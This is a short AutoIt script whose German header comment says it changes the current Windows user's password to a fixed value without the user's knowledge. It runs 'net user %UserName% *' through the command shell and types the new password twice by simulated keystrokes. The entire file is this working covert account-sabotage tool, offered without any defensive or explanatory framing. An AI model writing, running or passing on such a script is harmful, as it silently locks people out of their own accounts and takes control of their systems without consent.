;--------------------------------------------------
; p.au3
; aendert das Passwort des 
;	aktuellen Nutzers (ohne sein Wissen)
; zu HD5R8ZJ23
;--------------------------------------------------
AutoItSetOption ( "WinTitleMatchMode" , 2 )

Run(@COMSPEC & " /c net user %UserName% *")
WinWaitActive(".exe")
Send("HD5R8ZJ23")
Send("{ENTER}")
Send("HD5R8ZJ23")
Send("{ENTER}")